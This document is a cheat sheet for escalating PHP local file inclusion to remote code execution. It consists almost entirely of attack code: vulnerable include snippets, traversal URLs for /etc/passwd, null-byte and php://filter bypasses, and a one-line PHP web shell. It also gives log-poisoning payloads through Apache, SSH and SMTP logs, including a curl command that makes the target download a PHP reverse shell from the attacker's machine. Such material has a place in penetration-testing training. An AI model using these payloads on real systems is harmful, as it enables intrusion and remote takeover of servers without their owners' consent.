# LFI---RCE-Cheat-Sheet
Transition form local file inclusion attacks to remote code exection

# Vulnerable PHP Code (LFI) 1

```
<?php
$file = $_GET['file'];

 include('directory/' . $file)

?>

Example URL: http//10.10.10.10/index.php?file=../../../../../../../etc/passwd
    
```

# Vulnerable PHP Code (LFI) 2

```
<?php
   $file = $_GET['file'];
   if(isset($file))
   {
       include("$file");
   }
   else
   {
       include("index.php");
   }
   ?>


Example URL: http//10.10.10.10/index.php?file=../../../../../../../etc/passwd
    
```

# Bypassing PHP via NULL Byte

```
http://example.com/index.php?page=../../../etc/passwd%00 // Only applies to PHP 5.3.4 and below
    
```

# Bypassing PHP via WRAPPERS

```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
    
```

# PHP RCE

```
<?php system($_GET['c']); ?>

```

# LFI to RCE via Apache Log File Poisoning (PHP)

```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log // Must have the ability to read the log file 

Payload: curl "http://192.168.8.108/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>" // Replace IP with your target 
Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log&cmd=id

OR
python -m SimpleHTTPServer 9000 // You can use any port
Payload: curl "http://<remote_ip>/" -H "User-Agent: <?php file_put_contents('shell.php',file_get_contents('http://<local_ip>:9000/shell-php-rev.php')) ?>" // This will download the PHP reverse shell from your web server onto the target

// file_put_contents('shell.php') = What it will be saved locally on the target
// file_get_contents('http://<local_ip>:9000/shell-php-rev.php') = Where is the shell on YOUR pc and WHAT is it called

Execute PHP Reverse Shell: http//10.10.10.10/shell.php
```

# LFI to RCE via SSH Log File Poisoning (PHP)

```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log // Must have the ability to read the log file
Payload: ssh <?php system($_GET['cmd']);?>@<target_ip> // Replace with the target IP

Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log&cmd=id

```

# LFI to RCE via SMTP Log File Poisoning (PHP)

```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/mail.log // Must have the ability to read the log file

telnet <target_ip> 25 // Replace with the target IP
MAIL FROM:<toor@gmail.com>
RCPT TO:<?php system($_GET['c']); ?>

Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/mail.log&c=id


```
